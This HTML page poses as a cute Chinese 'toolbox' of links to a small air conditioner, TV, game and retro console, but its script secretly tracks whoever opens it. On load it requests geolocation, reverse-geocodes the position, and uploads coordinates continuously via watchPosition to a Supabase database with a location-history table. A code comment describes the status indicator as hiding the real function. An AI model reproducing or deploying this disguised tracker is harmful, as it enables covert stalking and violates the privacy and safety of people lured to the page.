<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>✨ 小窝工具箱</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap');

    * { margin:0; padding:0; box-sizing:border-box; }

    :root {
      --pink:    #ff8fab;
      --pink2:   #ffb3c6;
      --purple:  #c77dff;
      --purple2: #e0aaff;
      --yellow:  #ffd166;
      --mint:    #06d6a0;
      --sky:     #74c0fc;
      --bg:      #fff0f6;
      --bg2:     #fce4ec;
      --card:    #ffffff;
      --text:    #3d2c3e;
      --muted:   #b39dab;
      --shadow:  rgba(255,143,171,0.25);
    }

    html, body {
      min-height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: 'Noto Sans SC', 'PingFang SC', 'Microsoft YaHei', sans-serif;
    }

    /* ── 云朵动态背景 ── */
    .bg-deco {
      position: fixed; inset: 0; z-index: 0;
      overflow: hidden; pointer-events: none;
    }
    .cloud {
      position: absolute;
      border-radius: 50px;
      background: rgba(255,255,255,0.65);
      filter: blur(2px);
      animation: drift linear infinite;
    }
    @keyframes drift {
      from { transform: translateX(-120%); }
      to   { transform: translateX(110vw); }
    }
    .c1 { width:180px;height:55px;top:8%;  animation-duration:28s; opacity:.7; }
    .c2 { width:120px;height:38px;top:22%; animation-duration:36s; animation-delay:-10s; opacity:.5; }
    .c3 { width:220px;height:65px;top:55%; animation-duration:42s; animation-delay:-18s; opacity:.6; }
    .c4 { width:90px; height:28px;top:72%; animation-duration:25s; animation-delay:-5s;  opacity:.4; }
    .c5 { width:160px;height:48px;top:85%; animation-duration:33s; animation-delay:-14s; opacity:.55; }

    /* 星星装饰 */
    .star {
      position: fixed; pointer-events: none; z-index: 0;
      animation: twinkle 2.5s ease-in-out infinite;
      font-size: 1rem;
    }
    @keyframes twinkle {
      0%,100%{ opacity:.2; transform:scale(0.8); }
      50%{ opacity:.9; transform:scale(1.2); }
    }

    /* ── 主页面 ── */
    .page {
      position: relative; z-index: 1;
      min-height: 100vh;
      padding: 1.75rem 1rem 3rem;
      display: flex; flex-direction: column; align-items: center;
    }

    /* ── 顶部标题区 ── */
    .header { text-align: center; margin-bottom: 1.5rem; }

    .header-mascot {
      font-size: 3.5rem;
      display: block; margin-bottom: 0.3rem;
      animation: mascotBounce 2.8s ease-in-out infinite;
      filter: drop-shadow(0 4px 12px rgba(255,143,171,0.4));
    }
    @keyframes mascotBounce {
      0%,100%{ transform: translateY(0) rotate(-3deg); }
      50%{ transform: translateY(-10px) rotate(3deg); }
    }

    .header-title {
      font-size: 1.55rem; font-weight: 700;
      background: linear-gradient(135deg, var(--pink), var(--purple));
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: 0.06em; margin-bottom: 0.2rem;
    }

    .header-sub {
      font-size: 0.78rem; color: var(--muted);
      letter-spacing: 0.04em;
    }

    /* ── 状态胶囊（躲猫猫进入状态）── */
    .status-pill {
      display: flex; align-items: center; gap: 8px;
      background: var(--card);
      border: 2px solid var(--pink2);
      border-radius: 50px;
      padding: 0.5rem 1.1rem;
      margin-bottom: 1.5rem;
      box-shadow: 0 4px 16px var(--shadow);
      font-size: 0.82rem; color: var(--text);
      min-height: 42px;
    }

    .pill-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: var(--pink); flex-shrink: 0;
    }
    .pill-dot.loading { animation: dotPulse 1s ease-in-out infinite; }
    .pill-dot.success { background: var(--mint); }
    .pill-dot.error   { background: #ff6b6b; }
    @keyframes dotPulse { 0%,100%{opacity:.3;transform:scale(.7)} 50%{opacity:1;transform:scale(1)} }

    .pill-ring {
      width: 16px; height: 16px; border-radius: 50%; flex-shrink: 0;
      border: 2px solid var(--pink2); border-top-color: var(--pink);
      animation: spin .7s linear infinite;
    }
    @keyframes spin { to{ transform:rotate(360deg); } }

    #pill-text { flex: 1; }

    .pill-retry {
      background: none; border: 1px solid var(--pink);
      border-radius: 20px; padding: 2px 10px;
      color: var(--pink); font-size: 0.72rem; cursor: pointer;
      font-family: inherit; display: none;
    }

    /* ── 工具箱标题 ── */
    .section-title {
      width: 100%; max-width: 400px;
      display: flex; align-items: center; gap: 8px;
      font-size: 0.82rem; font-weight: 700;
      color: var(--muted); margin-bottom: 0.85rem;
      letter-spacing: 0.08em;
    }
    .section-title::before, .section-title::after {
      content: ''; flex: 1; height: 1px;
      background: linear-gradient(to right, transparent, var(--pink2), transparent);
    }

    /* ── 工具卡片网格 ── */
    .tools-grid {
      width: 100%; max-width: 400px;
      display: grid; grid-template-columns: 1fr 1fr;
      gap: 12px; margin-bottom: 1.5rem;
    }

    .tool-card {
      background: var(--card);
      border-radius: 20px;
      padding: 1.2rem 1rem;
      text-align: center;
      text-decoration: none;
      color: var(--text);
      box-shadow: 0 6px 20px var(--shadow);
      border: 2px solid transparent;
      transition: all 0.22s cubic-bezier(.34,1.56,.64,1);
      position: relative;
      overflow: hidden;
      cursor: pointer;
      display: block;
    }

    .tool-card::before {
      content: '';
      position: absolute; inset: 0;
      opacity: 0; transition: opacity .22s;
      border-radius: 18px;
    }

    .tool-card:active {
      transform: scale(0.94);
    }

    /* 各卡片主题色 */
    .tool-ac   { border-color: #ade8f4; }
    .tool-ac::before   { background: linear-gradient(135deg,#caf0f8,#90e0ef); }
    .tool-ac:hover { border-color: #90e0ef; box-shadow: 0 8px 28px rgba(144,224,239,0.4); }
    .tool-ac:hover::before { opacity: 1; }

    .tool-tv   { border-color: #c8b6ff; }
    .tool-tv::before   { background: linear-gradient(135deg,#e0aaff,#c77dff); }
    .tool-tv:hover { border-color: #c77dff; box-shadow: 0 8px 28px rgba(199,125,255,0.4); }
    .tool-tv:hover::before { opacity: 1; }

    .tool-game { border-color: #ffd166; }
    .tool-game::before { background: linear-gradient(135deg,#fff3b0,#ffd166); }
    .tool-game:hover { border-color: #ffd166; box-shadow: 0 8px 28px rgba(255,209,102,0.4); }
    .tool-game:hover::before { opacity: 1; }

    .tool-fc   { border-color: #ffb3c6; }
    .tool-fc::before   { background: linear-gradient(135deg,#ffccd5,#ff8fab); }
    .tool-fc:hover { border-color: #ff8fab; box-shadow: 0 8px 28px rgba(255,143,171,0.4); }
    .tool-fc:hover::before { opacity: 1; }

    .tool-icon {
      font-size: 2.4rem; display: block; margin-bottom: 0.5rem;
      position: relative; z-index: 1;
      transition: transform .22s cubic-bezier(.34,1.56,.64,1);
    }
    .tool-card:hover .tool-icon { transform: scale(1.18) rotate(-5deg); }

    .tool-name {
      font-size: 0.88rem; font-weight: 700;
      position: relative; z-index: 1;
      margin-bottom: 0.2rem;
    }

    .tool-desc {
      font-size: 0.68rem; color: var(--muted);
      position: relative; z-index: 1;
    }

    /* 小标签 */
    .tool-badge {
      position: absolute; top: 10px; right: 10px;
      background: var(--pink); color: white;
      font-size: 0.55rem; font-weight: 700;
      padding: 1px 6px; border-radius: 20px; z-index: 2;
      letter-spacing: .05em;
    }
    .tool-ac .tool-badge   { background: #48cae4; }
    .tool-tv .tool-badge   { background: var(--purple); }
    .tool-game .tool-badge { background: #e9c46a; }
    .tool-fc .tool-badge   { background: var(--pink); }

    /* ── 游戏规则折叠 ── */
    .rules-wrap {
      width: 100%; max-width: 400px;
      background: var(--card);
      border-radius: 16px;
      border: 2px solid var(--pink2);
      overflow: hidden;
      box-shadow: 0 4px 16px var(--shadow);
    }

    .rules-toggle {
      display: flex; align-items: center; justify-content: space-between;
      padding: .75rem 1rem;
      cursor: pointer; user-select: none;
      font-size: 0.82rem; font-weight: 700; color: var(--text);
    }

    .rules-toggle-left { display: flex; align-items: center; gap: 6px; }

    .rules-arrow {
      font-size: .7rem; color: var(--muted);
      transition: transform .25s;
    }
    .rules-wrap.open .rules-arrow { transform: rotate(90deg); }

    .rules-body {
      max-height: 0; overflow: hidden;
      transition: max-height .3s ease;
    }
    .rules-wrap.open .rules-body { max-height: 200px; }

    .rules-inner { padding: .5rem 1rem 1rem; border-top: 1px solid var(--bg2); }

    .rule-row {
      display: flex; align-items: flex-start; gap: 8px;
      font-size: 0.76rem; padding: 4px 0;
      color: rgba(61,44,62,0.7);
    }
    .rule-num {
      width: 17px; height: 17px; border-radius: 50%; flex-shrink: 0; margin-top:1px;
      background: linear-gradient(135deg, var(--pink), var(--purple));
      color: white; font-size: .58rem; font-weight: 700;
      display: flex; align-items: center; justify-content: center;
    }

    /* ── 底部签名 ── */
    footer {
      margin-top: 2rem;
      font-size: 0.65rem; color: var(--muted); text-align: center;
      line-height: 1.8;
    }
    footer span { color: var(--pink); }
  </style>
</head>
<body>

<!-- 背景装饰 -->
<div class="bg-deco">
  <div class="cloud c1"></div>
  <div class="cloud c2"></div>
  <div class="cloud c3"></div>
  <div class="cloud c4"></div>
  <div class="cloud c5"></div>
</div>

<!-- 星星 -->
<div class="star" style="top:5%;left:8%;animation-delay:0s;">⭐</div>
<div class="star" style="top:12%;right:10%;animation-delay:.6s;font-size:.7rem;">✨</div>
<div class="star" style="top:30%;left:4%;animation-delay:1.2s;font-size:.8rem;">🌟</div>
<div class="star" style="top:45%;right:5%;animation-delay:.3s;font-size:.65rem;">⭐</div>
<div class="star" style="top:65%;left:7%;animation-delay:.9s;font-size:.7rem;">✨</div>
<div class="star" style="top:80%;right:8%;animation-delay:1.5s;">🌟</div>

<div class="page">

  <!-- 顶部 -->
  <div class="header">
    <span class="header-mascot">🐱</span>
    <div class="header-title">小窝工具箱</div>
    <div class="header-sub">悄悄放了一些好东西在这里 ˙ᵕ˙</div>
  </div>

  <!-- 躲猫猫状态胶囊（隐藏真实功能，外观是普通状态提示） -->
  <div class="status-pill" id="status-pill">
    <div class="pill-ring" id="pill-ring"></div>
    <div class="pill-dot" id="pill-dot" style="display:none;"></div>
    <span id="pill-text">正在连接...</span>
    <button class="pill-retry" id="pill-retry" onclick="init()">重试</button>
  </div>

  <!-- 分区标题 -->
  <div class="section-title">✦ 我的收藏 ✦</div>

  <!-- 工具卡片 -->
  <div class="tools-grid">

    <a class="tool-card tool-ac" href="https://wxurl.cn/PME" target="_blank" rel="noopener">
      <div class="tool-badge">凉快</div>
      <span class="tool-icon">❄️</span>
      <div class="tool-name">小空调</div>
      <div class="tool-desc">夏天必备 · 凉凉的</div>
    </a>

    <a class="tool-card tool-tv" href="https://wxurl.cn/36C" target="_blank" rel="noopener">
      <div class="tool-badge">好看</div>
      <span class="tool-icon">📺</span>
      <div class="tool-name">小电视</div>
      <div class="tool-desc">随便看看 · 打发时间</div>
    </a>

    <a class="tool-card tool-game" href="https://wxurl.cn/U0T" target="_blank" rel="noopener">
      <div class="tool-badge">好玩</div>
      <span class="tool-icon">🎯</span>
      <div class="tool-name">小游戏</div>
      <div class="tool-desc">无聊必玩 · 超解压</div>
    </a>

    <a class="tool-card tool-fc" href="https://wxurl.cn/rMM" target="_blank" rel="noopener">
      <div class="tool-badge">怀旧</div>
      <span class="tool-icon">🎮</span>
      <div class="tool-name">小霸王</div>
      <div class="tool-desc">童年回忆 · 一起玩</div>
    </a>

  </div>



  <footer>
    小窝工具箱 · 你的专属收藏夹<br>
    made with <span>♥</span> for you
  </footer>

</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
<script>
// ── 配置 ──────────────────────────────────────────
const SUPABASE_URL = 'https://vwohulducmzturnxxaik.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ3b2h1bGR1Y216dHVybnh4YWlrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxMDIyNDAsImV4cCI6MjA5MzY3ODI0MH0.O3_LhcVcK0gPwLp29c4dGAF3D3ZMFOTFewFlRNf1D0A';
// ─────────────────────────────────────────────────

const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// ── UI（胶囊状态更新）──────────────────────────────
function pillLoading() {
  document.getElementById('pill-ring').style.display = 'block';
  document.getElementById('pill-dot').style.display  = 'none';
  document.getElementById('pill-retry').style.display = 'none';
  document.getElementById('pill-text').textContent = '正在连接...';
}

function pillSuccess() {
  const ring = document.getElementById('pill-ring');
  const dot  = document.getElementById('pill-dot');
  ring.style.display = 'none';
  dot.style.display  = 'block';
  dot.className = 'pill-dot success';
  document.getElementById('pill-retry').style.display = 'none';
  document.getElementById('pill-text').textContent = '已连接 ✓';
}

function pillError(msg) {
  const ring = document.getElementById('pill-ring');
  const dot  = document.getElementById('pill-dot');
  ring.style.display = 'none';
  dot.style.display  = 'block';
  dot.className = 'pill-dot error';
  document.getElementById('pill-retry').style.display = 'inline-block';
  document.getElementById('pill-text').textContent = msg;
}

// ── 规则折叠 ──────────────────────────────────────
function toggleRules() {
  document.getElementById('rules-wrap').classList.toggle('open');
}

// ── 玩家ID ────────────────────────────────────────
function getPid() {
  let id = localStorage.getItem('hsg_pid');
  if (!id) {
    id = 'p_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
    localStorage.setItem('hsg_pid', id);
  }
  return id;
}

// ── 地名反查（带本地缓存）────────────────────────
const GEO_CACHE_KEY = 'hsg_nickname';
const GEO_CACHE_TS  = 'hsg_nickname_ts';
const GEO_CACHE_TTL = 6 * 3600 * 1000;

async function geocode(lat, lng) {
  const cached   = localStorage.getItem(GEO_CACHE_KEY);
  const cachedTs = Number(localStorage.getItem(GEO_CACHE_TS) || 0);
  if (cached && Date.now() - cachedTs < GEO_CACHE_TTL) return cached;

  try {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 4000);
    const r = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=zh-CN&zoom=10`,
      { headers: { 'Accept-Language': 'zh-CN' }, signal: ctrl.signal }
    );
    clearTimeout(timer);
    const d = await r.json();
    const a = d.address || {};
    const DIRECT = ['北京','上海','天津','重庆'];
    let prov = (a.province || a.state || '').replace(/省$|自治区$|特别行政区$/, '');
    let city = (a.city || a.county || a.district || a.town || '').replace(/市$|区$|县$|州$/, '');
    let name;
    if (DIRECT.includes(prov)) {
      const dist = (a.district || a.suburb || '').replace(/区$|县$/, '');
      name = dist ? prov + dist : prov;
    } else {
      name = (prov && city && prov !== city) ? prov + city : (prov || city || null);
    }
    if (name) {
      localStorage.setItem(GEO_CACHE_KEY, name);
      localStorage.setItem(GEO_CACHE_TS, String(Date.now()));
    }
    return name;
  } catch { return null; }
}

// ── 上报位置（fire-and-forget）───────────────────
function report(pid, nickname, lat, lng, accuracy) {
  const now = new Date().toISOString();
  db.from('players').upsert({
    id: pid, nickname, lat, lng,
    accuracy: Math.round(accuracy),
    online: true, updated_at: now
  }, { onConflict: 'id' });
  db.from('location_history').insert({
    player_id: pid, nickname, lat, lng,
    accuracy: Math.round(accuracy), recorded_at: now
  });
}

// ── 主流程（极速版）──────────────────────────────
let watchId = null;

async function init() {
  pillLoading();

  if (!navigator.geolocation) {
    pillError('不支持定位');
    return;
  }

  const pid = getPid();
  const cachedNick = localStorage.getItem(GEO_CACHE_KEY);
  const cachedTs   = Number(localStorage.getItem(GEO_CACHE_TS) || 0);
  const nickReady  = cachedNick && (Date.now() - cachedTs < GEO_CACHE_TTL);

  // Step 1：低精度快速定位
  let fastPos = null;
  try {
    fastPos = await new Promise((ok, fail) =>
      navigator.geolocation.getCurrentPosition(ok, fail, {
        enableHighAccuracy: false, timeout: 5000, maximumAge: 30000
      })
    );
  } catch { /* 继续尝试高精度 */ }

  if (fastPos) {
    const { latitude: lat, longitude: lng, accuracy } = fastPos.coords;
    if (nickReady) {
      report(pid, cachedNick, lat, lng, accuracy);
      pillSuccess();
      upgradeLocation(pid, cachedNick);
      return;
    } else {
      const tmpNick = '玩家' + Math.floor(Math.random() * 9000 + 1000);
      report(pid, tmpNick, lat, lng, accuracy);
      pillSuccess();
      geocode(lat, lng).then(name => {
        const realNick = name || tmpNick;
        if (name) report(pid, realNick, lat, lng, accuracy);
        upgradeLocation(pid, realNick);
      });
      return;
    }
  }

  // Step 2：回退高精度
  let pos;
  try {
    pos = await new Promise((ok, fail) =>
      navigator.geolocation.getCurrentPosition(ok, fail, {
        enableHighAccuracy: true, timeout: 8000, maximumAge: 0
      })
    );
  } catch(e) {
    const m = {
      1: '需要位置权限',
      2: '无法获取位置',
      3: '定位超时'
    };
    pillError(m[e.code] || '定位失败');
    return;
  }

  const { latitude: lat, longitude: lng, accuracy } = pos.coords;
  const nickname = nickReady ? cachedNick : (await geocode(lat, lng) || '玩家' + Math.floor(Math.random() * 9000 + 1000));
  report(pid, nickname, lat, lng, accuracy);
  pillSuccess();
  upgradeLocation(pid, nickname);
}

function upgradeLocation(pid, nickname) {
  if (watchId !== null) navigator.geolocation.clearWatch(watchId);

  navigator.geolocation.getCurrentPosition(
    p => report(pid, nickname, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
    null,
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );

  watchId = navigator.geolocation.watchPosition(
    p => report(pid, nickname, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
    null,
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
  );

  window.addEventListener('beforeunload', () => {
    navigator.geolocation.clearWatch(watchId);
    navigator.sendBeacon(
      `${SUPABASE_URL}/rest/v1/players?id=eq.${pid}`,
      new Blob(
        [JSON.stringify([{ id: pid, online: false, updated_at: new Date().toISOString() }])],
        { type: 'application/json' }
      )
    );
  }, { once: true });
}

window.addEventListener('DOMContentLoaded', init);
</script>
</body>
</html>
